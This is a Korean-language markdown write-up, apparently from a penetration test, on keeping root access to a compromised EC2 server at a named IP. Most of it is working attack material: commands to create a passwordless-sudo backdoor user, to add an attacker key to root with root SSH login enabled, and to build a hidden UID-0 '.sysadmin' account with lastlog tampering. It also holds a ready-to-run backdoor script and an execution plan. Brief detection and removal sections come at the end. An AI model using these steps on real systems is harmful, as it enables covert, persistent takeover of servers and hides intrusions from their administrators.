# 루트 권한 사용자 생성 분석

## 공격 시나리오

공격자가 서버를 완전히 장악한 후, 자신만의 백도어 계정을 생성하는 방법입니다.

### 목표
- 기존 ec2-user 계정과 별개로, 공격자만 아는 새로운 루트 권한 계정 생성
- SSH로 언제든지 접속 가능
- 원래 관리자가 모르게 지속적인 접근 유지

---

## 방법 1: sudoers에 추가된 새 사용자 생성

### 서버에서 실행할 명령어:

```bash
# 새 사용자 생성 (hacker라는 이름)
sudo useradd -m -s /bin/bash hacker

# 비밀번호 설정
echo 'hacker:P@ssw0rd123!' | sudo chpasswd

# sudo 권한 부여 (비밀번호 없이 sudo 가능)
echo 'hacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers.d/hacker

# 권한 설정
sudo chmod 440 /etc/sudoers.d/hacker

# SSH 키 생성 (공격자 로컬)
ssh-keygen -t rsa -f ~/.ssh/hacker_key -N ""

# 공개키를 서버에 추가
sudo mkdir -p /home/hacker/.ssh
sudo chmod 700 /home/hacker/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB..." | sudo tee /home/hacker/.ssh/authorized_keys
sudo chmod 600 /home/hacker/.ssh/authorized_keys
sudo chown -R hacker:hacker /home/hacker/.ssh
```

### 결과:
```bash
# 공격자 로컬에서
ssh -i ~/.ssh/hacker_key hacker@52.79.240.83

# 서버에서
hacker@server:~$ whoami
hacker

hacker@server:~$ sudo whoami
root  # 비밀번호 없이 root 권한 획득!
```

---

## 방법 2: 기존 root 계정에 SSH 키 추가 (더 직접적)

### 서버에서 실행:

```bash
# root의 SSH 디렉터리 생성
sudo mkdir -p /root/.ssh
sudo chmod 700 /root/.ssh

# 공격자의 공개키 추가
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB..." | sudo tee -a /root/.ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys

# SSH 설정에서 root 로그인 허용 (기본적으로 차단되어 있음)
sudo sed -i 's/#PermitRootLogin yes/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# SSH 재시작
sudo systemctl restart sshd
```

### 결과:
```bash
# 공격자 로컬에서
ssh -i ~/.ssh/hacker_key root@52.79.240.83

# 서버에서
root@server:~# whoami
root  # 직접 root로 로그인!
```

---

## 방법 3: 숨겨진 백도어 계정 (더 은밀하게)

### 서버에서 실행:

```bash
# 숨겨진 사용자 생성 (.으로 시작)
sudo useradd -m -s /bin/bash .sysadmin

# 비밀번호 설정
echo '.sysadmin:MyS3cr3tP@ss' | sudo chpasswd

# sudo 권한
echo '.sysadmin ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/.sysadmin
sudo chmod 440 /etc/sudoers.d/.sysadmin

# SSH 키 설정
sudo mkdir -p /home/.sysadmin/.ssh
sudo chmod 700 /home/.sysadmin/.ssh
echo "ssh-rsa AAAAB3Nza..." | sudo tee /home/.sysadmin/.ssh/authorized_keys
sudo chmod 600 /home/.sysadmin/.ssh/authorized_keys
sudo chown -R .sysadmin:.sysadmin /home/.sysadmin/.ssh

# lastlog 조작 (로그인 기록 숨기기)
sudo lastlog -u .sysadmin -t 999999

# /etc/passwd에서 숨기기 (고급 기법)
sudo sed -i 's/^\.sysadmin:x:/\.sysadmin:x:0:0:/' /etc/passwd  # UID=0으로 설정 (root와 동일)
```

### 특징:
- `who`, `w` 명령어에 나타나지 않음
- `.`으로 시작하는 이름으로 `ls /home`에서 기본적으로 숨겨짐
- UID=0으로 설정하면 root와 동일한 권한

---

## 증거 수집 (공격 성공 증명)

### 1. 새 사용자로 로그인 스크린샷
```bash
ssh -i ~/.ssh/hacker_key hacker@52.79.240.83
hacker@server:~$ whoami
hacker@server:~$ id
hacker@server:~$ sudo -l
```

### 2. /etc/passwd 확인
```bash
cat /etc/passwd | grep hacker
# hacker:x:1001:1001::/home/hacker:/bin/bash
```

### 3. sudoers 확인
```bash
sudo cat /etc/sudoers.d/hacker
# hacker ALL=(ALL) NOPASSWD:ALL
```

### 4. root 권한 실행
```bash
sudo whoami
# root

sudo cat /etc/shadow | head -1
# (root 패스워드 해시 확인)
```

---

## 자동화 스크립트

### 125_create_backdoor_user.sh

```bash
#!/bin/bash
###############################################################################
# 백도어 사용자 생성 스크립트
# 서버에서 실행하여 공격자의 접근 권한을 생성합니다.
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   백도어 사용자 생성 - 완전한 서버 장악                  ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# 루트 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo "[-] root 권한이 필요합니다"
    exit 1
fi

# 사용자명 입력
read -p "백도어 사용자 이름 (기본: hacker): " USERNAME
USERNAME=${USERNAME:-hacker}

# 비밀번호 입력
read -sp "비밀번호: " PASSWORD
echo ""

# 공개키 입력
echo ""
echo "SSH 공개키를 입력하세요 (엔터 두 번으로 종료):"
SSH_KEY=""
while IFS= read -r line; do
    [ -z "$line" ] && break
    SSH_KEY="$line"
done

# 1. 사용자 생성
echo "[1] 사용자 생성 중..."
useradd -m -s /bin/bash "$USERNAME"
echo "$USERNAME:$PASSWORD" | chpasswd
echo "[+] 사용자 생성 완료: $USERNAME"

# 2. sudo 권한 부여
echo "[2] sudo 권한 부여 중..."
echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/"$USERNAME"
chmod 440 /etc/sudoers.d/"$USERNAME"
echo "[+] sudo 권한 부여 완료"

# 3. SSH 키 설정
if [ -n "$SSH_KEY" ]; then
    echo "[3] SSH 키 설정 중..."
    mkdir -p /home/"$USERNAME"/.ssh
    chmod 700 /home/"$USERNAME"/.ssh
    echo "$SSH_KEY" > /home/"$USERNAME"/.ssh/authorized_keys
    chmod 600 /home/"$USERNAME"/.ssh/authorized_keys
    chown -R "$USERNAME":"$USERNAME" /home/"$USERNAME"/.ssh
    echo "[+] SSH 키 설정 완료"
else
    echo "[3] SSH 키 건너뛰기"
fi

# 4. 완료
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ✅ 백도어 사용자 생성 완료!                             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "[+] 사용자: $USERNAME"
echo "[+] 권한: sudo (NOPASSWD)"
echo ""
echo "로컬에서 접속:"
echo "    ssh $USERNAME@\$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)"
echo ""
echo "또는 SSH 키로:"
echo "    ssh -i ~/.ssh/your_key $USERNAME@52.79.240.83"
echo ""
```

---

## 방어 방법

### 탐지:

```bash
# 1. 최근 생성된 사용자 확인
sudo cat /etc/passwd | awk -F: '$3 >= 1000 {print $1, $3, $6}'

# 2. sudoers 파일 확인
sudo ls -la /etc/sudoers.d/

# 3. SSH authorized_keys 확인
sudo find /home -name authorized_keys -exec ls -la {} \;
sudo find /root -name authorized_keys -exec ls -la {} \;

# 4. 최근 로그인 기록
last -20
lastlog
```

### 제거:

```bash
# 백도어 사용자 삭제
sudo userdel -r hacker

# sudoers 파일 삭제
sudo rm /etc/sudoers.d/hacker

# SSH 키 확인 및 삭제
sudo cat /root/.ssh/authorized_keys  # 의심스러운 키 확인
sudo rm /root/.ssh/authorized_keys  # 또는 특정 키만 제거
```

---

## 실행 계획

### Step 1: 서버에 접속 (기존 ec2-user)
```bash
ssh ec2-user@52.79.240.83
```

### Step 2: 백도어 사용자 생성 스크립트 업로드
```bash
# 로컬에서
scp 125_create_backdoor_user.sh ec2-user@52.79.240.83:/tmp/
```

### Step 3: 서버에서 실행
```bash
sudo bash /tmp/125_create_backdoor_user.sh
```

### Step 4: 새 사용자로 접속 테스트
```bash
# 로컬에서
ssh hacker@52.79.240.83
```

### Step 5: 루트 권한 확인
```bash
whoami      # hacker
sudo whoami # root
```

### Step 6: 증거 수집
- 스크린샷 캡처
- `/etc/passwd` 확인
- sudo 권한 실행 결과

---

## 보안 권고

이 공격이 성공한 이유:
1. **ec2-user가 NOPASSWD sudo 권한을 가짐** (AWS 기본 설정)
2. **SSH 접근 후 새 사용자 생성 가능**
3. **sudoers 파일 수정 가능**
4. **지속적인 접근 유지 (persistence)**

방어책:
1. **정기적인 사용자 계정 감사**
2. **sudoers 파일 변경 감지** (파일 무결성 모니터링)
3. **SSH authorized_keys 모니터링**
4. **로그인 기록 분석** (lastlog, wtmp, btmp)
5. **2FA (이중 인증) 적용**

---

이 분석은 교육 목적으로만 사용되어야 하며, 무단 접근은 불법입니다.
